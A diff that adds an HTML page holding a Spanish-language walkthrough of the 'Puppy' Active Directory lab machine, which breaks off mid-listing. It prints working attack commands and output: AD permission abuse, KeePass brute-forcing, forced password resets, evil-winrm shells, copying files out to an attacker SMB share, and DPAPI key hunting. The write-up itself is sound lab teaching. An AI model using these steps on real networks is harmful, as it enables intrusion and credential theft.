@@ -1,0 +1,868 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Puppy | Borhub Blog</title>
+<meta name="keywords" content="Puppy, Medium, Active Directoy, GenericWrite, GenericALL, DPAPI">
+<meta name="description" content="Writeup sobre la máquina Puppy en Active Directory de dificultad Media. Durante el acceso inicial abusaremos de privilegios GenericWrite y GenericALL además de descubrir un archivo de credenciales, luego procederemos a movernos al usuario steph.cooper gracias a un leak de información y acabaremos escalando privilegios gracias al descubrimiento de archivos DPAPI.">
+<meta name="author" content="Borhub">
+<link rel="canonical" href="https://borhuub.github.io/writeups/puppy/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.0c6701118f5c7e049c5fa8762210566ca9a5a1174e56560126f872ccc4e942a1.css" integrity="sha256-DGcBEY9cfgScX6h2IhBWbKmloRdOVlYBJvhyzMTpQqE=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="icon" type="image/png" sizes="16x16" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="icon" type="image/png" sizes="32x32" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="apple-touch-icon" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="mask-icon" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://borhuub.github.io/writeups/puppy/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://borhuub.github.io/writeups/puppy/">
+  <meta property="og:site_name" content="Borhub Blog">
+  <meta property="og:title" content="Puppy">
+  <meta property="og:description" content="Writeup sobre la máquina Puppy en Active Directory de dificultad Media. Durante el acceso inicial abusaremos de privilegios GenericWrite y GenericALL además de descubrir un archivo de credenciales, luego procederemos a movernos al usuario steph.cooper gracias a un leak de información y acabaremos escalando privilegios gracias al descubrimiento de archivos DPAPI.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:tag" content="Puppy">
+    <meta property="article:tag" content="Medium">
+    <meta property="article:tag" content="Active Directoy">
+    <meta property="article:tag" content="GenericWrite">
+    <meta property="article:tag" content="GenericALL">
+    <meta property="article:tag" content="DPAPI">
+    <meta property="og:image" content="https://borhuub.github.io/logo_machines/puppy.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://borhuub.github.io/logo_machines/puppy.png">
+<meta name="twitter:title" content="Puppy">
+<meta name="twitter:description" content="Writeup sobre la máquina Puppy en Active Directory de dificultad Media. Durante el acceso inicial abusaremos de privilegios GenericWrite y GenericALL además de descubrir un archivo de credenciales, luego procederemos a movernos al usuario steph.cooper gracias a un leak de información y acabaremos escalando privilegios gracias al descubrimiento de archivos DPAPI.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Writeups",
+      "item": "https://borhuub.github.io/writeups/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Puppy",
+      "item": "https://borhuub.github.io/writeups/puppy/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Puppy",
+  "name": "Puppy",
+  "description": "Writeup sobre la máquina Puppy en Active Directory de dificultad Media. Durante el acceso inicial abusaremos de privilegios GenericWrite y GenericALL además de descubrir un archivo de credenciales, luego procederemos a movernos al usuario steph.cooper gracias a un leak de información y acabaremos escalando privilegios gracias al descubrimiento de archivos DPAPI.",
+  "keywords": [
+    "Puppy", "Medium", "Active Directoy", "GenericWrite", "GenericALL", "DPAPI"
+  ],
+  "articleBody": "Máquina Medium - Windows | Credenciales levi.james / KingofAkron2025!\nReconocimiento ❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.70 -oG ports [sudo] contraseña para borhub: Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-02 09:32 CEST Initiating SYN Stealth Scan at 09:32 Scanning 10.10.11.70 [65535 ports] Discovered open port 135/tcp on 10.10.11.70 Discovered open port 139/tcp on 10.10.11.70 Discovered open port 111/tcp on 10.10.11.70 Discovered open port 53/tcp on 10.10.11.70 Discovered open port 445/tcp on 10.10.11.70 Discovered open port 3268/tcp on 10.10.11.70 Discovered open port 9389/tcp on 10.10.11.70 Discovered open port 593/tcp on 10.10.11.70 Discovered open port 5985/tcp on 10.10.11.70 Discovered open port 636/tcp on 10.10.11.70 Discovered open port 2049/tcp on 10.10.11.70 Discovered open port 49664/tcp on 10.10.11.70 Discovered open port 63992/tcp on 10.10.11.70 Discovered open port 3260/tcp on 10.10.11.70 Discovered open port 49667/tcp on 10.10.11.70 Discovered open port 64010/tcp on 10.10.11.70 Discovered open port 3269/tcp on 10.10.11.70 Discovered open port 389/tcp on 10.10.11.70 Discovered open port 49670/tcp on 10.10.11.70 Discovered open port 88/tcp on 10.10.11.70 Discovered open port 49669/tcp on 10.10.11.70 Discovered open port 464/tcp on 10.10.11.70 Completed SYN Stealth Scan at 09:32, 26.40s elapsed (65535 total ports) Nmap scan report for 10.10.11.70 Host is up, received user-set (0.052s latency). Scanned at 2025-06-02 09:32:02 CEST for 26s Not shown: 65513 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 53/tcp open domain syn-ack ttl 127 88/tcp open kerberos-sec syn-ack ttl 127 111/tcp open rpcbind syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 389/tcp open ldap syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 464/tcp open kpasswd5 syn-ack ttl 127 593/tcp open http-rpc-epmap syn-ack ttl 127 636/tcp open ldapssl syn-ack ttl 127 2049/tcp open nfs syn-ack ttl 127 3260/tcp open iscsi syn-ack ttl 127 3268/tcp open globalcatLDAP syn-ack ttl 127 3269/tcp open globalcatLDAPssl syn-ack ttl 127 5985/tcp open wsman syn-ack ttl 127 9389/tcp open adws syn-ack ttl 127 49664/tcp open unknown syn-ack ttl 127 49667/tcp open unknown syn-ack ttl 127 49669/tcp open unknown syn-ack ttl 127 49670/tcp open unknown syn-ack ttl 127 63992/tcp open unknown syn-ack ttl 127 64010/tcp open unknown syn-ack ttl 127 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 26.45 seconds Raw packets sent: 131060 (5.767MB) | Rcvd: 34 (1.496KB) ❯ sudo nmap -sCV -p 53,88,111,135,139,389,445,464,593,636,2049,3260,3268,3269,5985,9389,49664,49667,49669,49670,63992,64010 10.10.11.70 -oN targeted Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-02 09:35 CEST Nmap scan report for puppy.htb (10.10.11.70) Host is up (0.097s latency). Bug in iscsi-info: no string output. PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-06-02 14:35:30Z) 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/tcp6 rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 2,3,4 111/udp6 rpcbind | 100003 2,3 2049/udp nfs | 100003 2,3 2049/udp6 nfs | 100005 1,2,3 2049/udp mountd | 100005 1,2,3 2049/udp6 mountd | 100021 1,2,3,4 2049/tcp nlockmgr | 100021 1,2,3,4 2049/tcp6 nlockmgr | 100021 1,2,3,4 2049/udp nlockmgr | 100021 1,2,3,4 2049/udp6 nlockmgr | 100024 1 2049/tcp status | 100024 1 2049/tcp6 status | 100024 1 2049/udp status |_ 100024 1 2049/udp6 status 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 2049/tcp open nlockmgr 1-4 (RPC #100021) 3260/tcp open iscsi? 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 49664/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 49670/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 63992/tcp open msrpc Microsoft Windows RPC 64010/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 6h59m58s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2025-06-02T14:37:20 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 208.23 seconds Enumeración SMB Comprobamos que las credenciales que tenemos sean válidas para smb:\n❯ nxc smb 10.10.11.70 -u 'levi.james' -p 'KingofAkron2025!' SMB 10.10.11.70 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) SMB 10.10.11.70 445 DC [+] PUPPY.HTB\\levi.james:KingofAkron2025! Listado de carpetas compartidas, parece que de momento no tenemos permiso de lectura con la carpeta DEV aunque luego lo comprobaremos:\n❯ nxc smb 10.10.11.70 -u 'levi.james' -p 'KingofAkron2025!' --shares SMB 10.10.11.70 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) SMB 10.10.11.70 445 DC [+] PUPPY.HTB\\levi.james:KingofAkron2025! SMB 10.10.11.70 445 DC [*] Enumerated shares SMB 10.10.11.70 445 DC Share Permissions Remark SMB 10.10.11.70 445 DC ----- ----------- ------ SMB 10.10.11.70 445 DC ADMIN$ Remote Admin SMB 10.10.11.70 445 DC C$ Default share SMB 10.10.11.70 445 DC DEV DEV-SHARE for PUPPY-DEVS SMB 10.10.11.70 445 DC IPC$ READ Remote IPC SMB 10.10.11.70 445 DC NETLOGON READ Logon server share SMB 10.10.11.70 445 DC SYSVOL READ Logon server share Listado de usuarios:\n❯ nxc smb 10.10.11.70 -u 'levi.james' -p 'KingofAkron2025!' --users SMB 10.10.11.70 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) SMB 10.10.11.70 445 DC [+] PUPPY.HTB\\levi.james:KingofAkron2025! SMB 10.10.11.70 445 DC -Username- -Last PW Set- -BadPW- -Description- SMB 10.10.11.70 445 DC Administrator 2025-02-19 19:33:28 0 Built-in account for administering the computer/domain SMB 10.10.11.70 445 DC Guest 0 Built-in account for guest access to the computer/domain SMB 10.10.11.70 445 DC krbtgt 2025-02-19 11:46:15 0 Key Distribution Center Service Account SMB 10.10.11.70 445 DC levi.james 2025-02-19 12:10:56 0 SMB 10.10.11.70 445 DC ant.edwards 2025-02-19 12:13:14 0 SMB 10.10.11.70 445 DC adam.silver 2025-06-02 14:34:28 0 SMB 10.10.11.70 445 DC jamie.williams 2025-02-19 12:17:26 0 SMB 10.10.11.70 445 DC steph.cooper 2025-02-19 12:21:00 0 SMB 10.10.11.70 445 DC steph.cooper_adm 2025-03-08 15:50:40 0 SMB 10.10.11.70 445 DC [*] Enumerated 9 local users: PUPPY Ahora nos conectamos a la carpeta compartida DEV pero vemos que no tenemos ningún tipo de permiso:\n❯ smbclient \\\\\\\\10.10.11.70\\\\DEV -U PUPPY.HTB\\\\levi.james Password for [PUPPY.HTB\\levi.james]: Try \"help\" to get a list of possible commands. smb: \\\u003e dir NT_STATUS_ACCESS_DENIED listing \\* smb: \\\u003e ls NT_STATUS_ACCESS_DENIED listing \\* smb: \\\u003e get get [localname] Procedemos a hacer un escaneo con bloodhound usando las credenciales del usuario levi.james.\nEnumeración con bloodhound ❯ bloodhound-python -u levi.james -p 'KingofAkron2025!' -d PUPPY.HTB -ns 10.10.11.70 -c all --zip Abusando de privilegios GenericWrite - BloodyAD o Net Rpc Vemos que levi.james es miembro del grupo HR, y el grupo HR tiene permisos GenericWrite sobre el grupo DEVELOPERS. Con lo cual vamos a añadir al usuario levi.james al grupo de DEVELOPERS mediante bloodyAD o net rpc.\n❯ bloodyAD --host 10.10.11.70 -d PUPPY.HTB -u 'levi.james' -p 'KingofAkron2025!' add groupMember 'DEVELOPERS' 'levi.james' [+] levi.james added to DEVELOPERS ❯ net rpc group addmem \"DEVELOPERS\" \"levi.james\" -U \"PUPPY.HTB\"/\"levi.james\"%'KingofAkron2025!' -S \"10.10.11.70\" Ponemos entre comillas simples la contraseña ya que contiene caracteres especiales como “!”\nAhora que ya hemos añadido al usuario levi.james vamos a comprobar si tenemos permisos sobre la carpeta compartida DEV con nxc.\n❯ nxc smb 10.10.11.70 -u 'levi.james' -p 'KingofAkron2025!' --shares SMB 10.10.11.70 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) SMB 10.10.11.70 445 DC [+] PUPPY.HTB\\levi.james:KingofAkron2025! SMB 10.10.11.70 445 DC [*] Enumerated shares SMB 10.10.11.70 445 DC Share Permissions Remark SMB 10.10.11.70 445 DC ----- ----------- ------ SMB 10.10.11.70 445 DC ADMIN$ Remote Admin SMB 10.10.11.70 445 DC C$ Default share SMB 10.10.11.70 445 DC DEV READ DEV-SHARE for PUPPY-DEVS SMB 10.10.11.70 445 DC IPC$ READ Remote IPC SMB 10.10.11.70 445 DC NETLOGON READ Logon server share SMB 10.10.11.70 445 DC SYSVOL READ Logon server share Vemos que ahora si que tenemos permisos de lectura y nos conectamos a la carpeta compartida con smbclient.\n❯ smbclient \\\\\\\\10.10.11.70\\\\DEV -U PUPPY.HTB\\\\levi.james Can't load /etc/samba/smb.conf - run testparm to debug it Password for [PUPPY.HTB\\levi.james]: Try \"help\" to get a list of possible commands. smb: \\\u003e ls . DR 0 Sun Mar 23 08:07:57 2025 .. D 0 Sat Mar 8 17:52:57 2025 KeePassXC-2.7.9-Win64.msi A 34394112 Sun Mar 23 08:09:12 2025 Projects D 0 Sat Mar 8 17:53:36 2025 recovery.kdbx A 2677 Wed Mar 12 03:25:46 2025 5080575 blocks of size 4096. 1646472 blocks available Tenemos un archivo .kdbk que es un archivo que almacena credenciales de forma segura y normalmente requiere una contraseña o un archivo clave (keyfile).\nComo no tenemos la contraseña ni nada parecido vamos a intentar extraer el hash con keepass2jhon y luego crackearlo pero no nos funciona.\n❯ keepass2john recovery.kdbx ! recovery.kdbx : File version '40000' is currently not supported! Ataque por fuerza bruta al archivo .kdbx - Keepass4brute Vamos a probar un ataque por fuerza bruta con keepass4brute.\n❯ /opt/Herramientas/keepass4brute/keepass4brute.sh recovery.kdbx /usr/share/SecLists/Passwords/xato-net-10-million-passwords-1000000.txt keepass4brute 1.3 by r3nt0n https://github.com/r3nt0n/keepass4brute [+] Words tested: 345/1000000 - Attempts per minute: 113 - Estimated time remaining: 6 days, 3 hours [+] Current attempt: liverpool [*] Password found: liverpool Vemos que nos encuentra una coincidencia con la contraseña “liverpool” con lo cual vamos a volver abrir el archivo con keepassxc para comprobar que sea válida.\nAhora que tenemos una lista con unas credenciales vamos a comprobar las credenciales con la lista de usuarios sacada anteriormente con nxc.\nComprobación de credenciales con nxc ❯ nxc smb 10.10.11.70 -u 'users' -p 'passwords' SMB 10.10.11.70 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) SMB 10.10.11.70 445 DC [-] PUPPY.HTB\\Administrator:JamieLove2025! STATUS_LOGON_FAILURE SMB 10.10.11.70 445 DC [-] PUPPY.HTB\\Guest:JamieLove2025! STATUS_LOGON_FAILURE SMB 10.10.11.70 445 DC [-] PUPPY.HTB\\krbtgt:Antman2025! STATUS_LOGON_FAILURE SMB 10.10.11.70 445 DC [-] PUPPY.HTB\\levi.james:Antman2025! STATUS_LOGON_FAILURE SMB 10.10.11.70 445 DC [+] PUPPY.HTB\\ant.edwards:Antman2025! Ahora que tenemos nuevas credenciales disponibles vamos a volver a mirar el bloodhound para ver que clase de permisos tiene.\nEnumerando los permisos que tiene el usuario ant.edwards vemos que es miembro de SENIOR DEVS que a la vez tiene permisos GenericAll sobre adam.silver.\nKerberoast attack [FAILED] ❯ sudo ntpdate -u 10.10.11.70 [sudo] contraseña para borhub: 3 Jun 23:52:00 ntpdate[10694]: adjust time server 10.10.11.70 offset -0.003879 sec ❯ /opt/Herramientas/targetedKerberoast/targetedKerberoast.py --dc-ip 10.10.11.70 -d 'PUPPY.HTB' -u 'ant.edwards' -p 'Antman2025!' [*] Starting kerberoast attacks [*] Fetching usernames from Active Directory with LDAP Shadow Credential Attack [FAILED] ❯ /opt/Herramientas/pywhisker/pywhisker.py --dc-ip 10.10.11.70 -d 'PUPPY.HTB' -u 'ant.edwards' -p 'Antman2025!' --target \"adam.silver\" --action \"add\" [*] Searching for the target account [*] Target user found: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB [*] Generating certificate [*] Certificate generated [*] Generating KeyCredential [*] KeyCredential generated with DeviceID: 50d01920-0320-e928-73a2-9d3796ebeaf4 [*] Updating the msDS-KeyCredentialLink attribute of adam.silver [+] Updated the msDS-KeyCredentialLink attribute of the target object [*] Converting PEM -\u003e PFX with cryptography: DM4pfjWo.pfx [+] PFX exportiert nach: DM4pfjWo.pfx [i] Passwort für PFX: ARoPYbPOSeV621UmpShy [+] Saved PFX (#PKCS12) certificate \u0026 key at path: DM4pfjWo.pfx [*] Must be used with password: ARoPYbPOSeV621UmpShy [*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools Intentamos ahora con gettgtpkini obtener el TGT pero nos da el siguiente error:\n❯ /opt/Herramientas/PKINITtools/gettgtpkinit.py -cert-pfx DM4pfjWo.pfx -pfx-pass 'ARoPYbPOSeV621UmpShy' PUPPY.HTB/adam.silver adam.silver.ccache -dc-ip 10.10.11.70 2025-06-04 00:15:27,177 minikerberos INFO Loading certificate and key from file INFO:minikerberos:Loading certificate and key from file 2025-06-04 00:15:27,195 minikerberos INFO Requesting TGT INFO:minikerberos:Requesting TGT Traceback (most recent call last): File \"/opt/Herramientas/PKINITtools/gettgtpkinit.py\", line 349, in main() ~~~~^^ File \"/opt/Herramientas/PKINITtools/gettgtpkinit.py\", line 345, in main amain(args) ~~~~~^^^^^^ File \"/opt/Herramientas/PKINITtools/gettgtpkinit.py\", line 315, in amain res = sock.sendrecv(req) File \"/home/borhub/Entornos-Pentesting/pentest-venv/lib/python3.13/site-packages/minikerberos/network/clientsocket.py\", line 85, in sendrecv raise KerberosError(krb_message) minikerberos.protocol.errors.KerberosError: Error Name: KDC_ERR_CLIENT_REVOKED Detail: \"Client’s credentials have been revoked\" This might be because of an explicit disabling or because of other restrictions in place on the account. For example: account disabled, expired, or locked out.\nForce Change Password - Net rpc Cambiamos contraseña usuario adam.silver - Net rpc\n❯ net rpc password \"adam.silver\" 'micontrafavorita2025!' -U \"PUPPY.HTB\"/\"ant.edwards\"%'Antman2025!' -S \"10.10.11.70\" Intentamos abrir una shell remota y obtenemos un código de error:\n❯ evil-winrm -u adam.silver -p micontraseñafavorita2025! -i 10.10.11.70 Evil-WinRM shell v3.7 Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError Error: Exiting with code 1 Entonces vamos a comprobar con nxc las credenciales y vemos que el estado de la cuenta esta DESHABILITADA. (También lo podríamos haber visto en el bloodhound pero yo no me di cuenta)\n❯ nxc smb 10.10.11.70 -u 'adam.silver' -p 'micontraseñafavorita2025!' SMB 10.10.11.70 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) SMB 10.10.11.70 445 DC [-] PUPPY.HTB\\adam.silver:micontraseñafavorita2025! STATUS_ACCOUNT_DISABLED Deshabilitar ACCOUNTDISABLE - BloodyAD ❯ bloodyAD --host 10.10.11.70 -d PUPPY.HTB -u 'ant.edwards' -p 'Antman2025!' remove uac 'adam.silver' -f ACCOUNTDISABLE [-] ['ACCOUNTDISABLE'] property flags removed from adam.silver's userAccountControl Una vez quitada la flag ACCOUNTDISABLE volvemos a probar con nxc winrm y nos indica que todo ha ido correctamente.\n❯ nxc winrm 10.10.11.70 -u 'adam.silver' -p 'micontraseñafavorita2025!' WINRM 10.10.11.70 5985 DC [*] Windows Server 2022 Build 20348 (name:DC) (domain:PUPPY.HTB) WINRM 10.10.11.70 5985 DC [+] PUPPY.HTB\\adam.silver:micontraseñafavorita2025! (Pwn3d!) Entonces nos creamos una shell con evil-winrm.\n❯ evil-winrm -i 10.10.11.70 -u adam.silver -p 'micontrafavorita2025!' Evil-WinRM shell v3.7 Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\adam.silver\\Documents\u003e type ../Desktop/user.txt 58e2e43ead7d8708ec72dba552fe0e25 Movimiento lateral Una vez tenemos nuestra shell con el usuario adam.silver nos ponemos a enumerar el sistema manualmente. En C:/ nos encontramos la carpeta Backups que dentro tiene un archivo .zip llamado site-backup-2024-12-30.zip, que nos los descargamos a nuestra máquina atacante para enumerarlo.\n*Evil-WinRM* PS C:\\\u003e ls Directory: C:\\ Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 5/9/2025 10:48 AM Backups d----- 5/12/2025 5:21 PM inetpub d----- 5/8/2021 1:20 AM PerfLogs d-r--- 4/4/2025 3:40 PM Program Files d----- 5/8/2021 2:40 AM Program Files (x86) d----- 3/8/2025 9:00 AM StorageReports d-r--- 3/8/2025 8:52 AM Users d----- 5/13/2025 4:40 PM Windows *Evil-WinRM* PS C:\\\u003e cd Backups *Evil-WinRM* PS C:\\Backups\u003e ls Directory: C:\\Backups Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 3/8/2025 8:22 AM 4639546 site-backup-2024-12-30.zip Descarga de archivos con smb server ❯ sudo smbserver.py smbFolder $(pwd) -smb2support [sudo] contraseña para borhub: /usr/lib/python3.13/site-packages/impacket/version.py:10: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools\u003c81. import pkg_resources Impacket v0.11.0 - Copyright 2023 Fortra [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed [*] Incoming connection (10.10.11.70,62080) [*] AUTHENTICATE_MESSAGE (\\,DC) [*] User DC\\ authenticated successfully [*] :::00::aaaaaaaaaaaaaaaa [*] Connecting Share(1:IPC$) [*] Connecting Share(2:smbFolder) [*] Disconnecting Share(1:IPC$) [*] Disconnecting Share(2:smbFolder) [*] Closing down connection (10.10.11.70,62080) [*] Remaining connections [] *Evil-WinRM* PS C:\\Backups\u003e copy C:\\Backups\\site-backup-2024-12-30.zip \\\\10.10.15.254\\smbFolder\\ Leak Information Una vez tenemos el archivo en nuestra máquina lo descomprimimos y enumeramos.\n❯ unzip site-backup-2024-12-30.zip Descubrimos las credenciales del usuario steph.cooper, anteriormente en la enumeración de usuarios vimos que steph tenia el usuario normal y el usuario adm. Tratamos de obtener una shell con ambos pero solo la conseguimos con el usuario normal.\n❯ evil-winrm -i 10.10.11.70 -u steph.cooper -p 'ChefSteph2025!' Evil-WinRM shell v3.7 Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\steph.cooper\\Documents\u003e Escalada de privilegios winPEASx64.exe ❯ wget https://github.com/peass-ng/PEASS-ng/releases/download/20241101-6f46e855/winPEASx64.exe --2025-06-07 21:14:47-- https://github.com/peass-ng/PEASS-ng/releases/download/20241101-6f46e855/winPEASx64.exe Cargado certificado CA '/etc/ssl/certs/ca-certificates.crt' Resolviendo github.com (github.com)... 140.82.121.4 Conectando con github.com (github.com)[140.82.121.4]:443... conectado. Petición HTTP enviada, esperando respuesta... 302 Found Localización: https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/207d3f3e-bc37-4b37-ba85-5c4fa16d48c4?X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=releaseassetproduction%2F20250607%2Fus-east-1%2Fs3%2Faws4_request\u0026X-Amz-Date=20250607T191444Z\u0026X-Amz-Expires=300\u0026X-Amz-Signature=81be8126c8c0a48b4ad96347f3825ffc8a7c84640cab34ab7df9f980940a22c1\u0026X-Amz-SignedHeaders=host\u0026response-content-disposition=attachment%3B%20filename%3DwinPEASx64.exe\u0026response-content-type=application%2Foctet-stream [siguiendo] --2025-06-07 21:14:48-- https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/207d3f3e-bc37-4b37-ba85-5c4fa16d48c4?X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=releaseassetproduction%2F20250607%2Fus-east-1%2Fs3%2Faws4_request\u0026X-Amz-Date=20250607T191444Z\u0026X-Amz-Expires=300\u0026X-Amz-Signature=81be8126c8c0a48b4ad96347f3825ffc8a7c84640cab34ab7df9f980940a22c1\u0026X-Amz-SignedHeaders=host\u0026response-content-disposition=attachment%3B%20filename%3DwinPEASx64.exe\u0026response-content-type=application%2Foctet-stream Resolviendo objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.110.133, 185.199.108.133, 185.199.109.133, ... Conectando con objects.githubusercontent.com (objects.githubusercontent.com)[185.199.110.133]:443... conectado. Petición HTTP enviada, esperando respuesta... 200 OK Longitud: 9842176 (9,4M) [application/octet-stream] Grabando a: «winPEASx64.exe» winPEASx64.exe 100%[======================================================================================================================\u003e] 9,39M 51,1MB/s en 0,2s 2025-06-07 21:14:48 (51,1 MB/s) - «winPEASx64.exe» guardado [9842176/9842176] Con el winPEAS encontramos información relacionada con DPAPI.\nDPAPI (Data Protection API) DPAPI (Data Protection API) es un componente de Windows que permite cifrar y descifrar datos utilizando las credenciales del usuario o del sistema. Es usado por aplicaciones para almacenar contraseñas, claves y otros datos sensibles de forma segura.\nDPAPI Master Keys Las Master Keys son archivos que contienen una clave maestra generada por DPAPI para cada usuario, estas claves son usadas para cifrar/descifrar otros secretos almacenados.\nDPAPI Credentials File Son archivos que contienen credenciales cifradas con DPAPI como contraseñas etc.\nDescargar archivos con smb server Primero viajo a la ruta en la que se encuentra la Master Key para descargarme el archivo cuando llego al directorio no me sale el archivo así que supongo que esta en oculto.\n*Evil-WinRM* PS C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-1487982659-1829050783-2281216199-1107\u003e Get-ChildItem -Force -Hidden \"C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-1487982659-1829050783-2281216199-1107\" Directory: C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-1487982659-1829050783-2281216199-1107 Mode LastWriteTime Length Name ---- ------------- ------ ---- -a-hs- 3/8/2025 7:40 AM 740 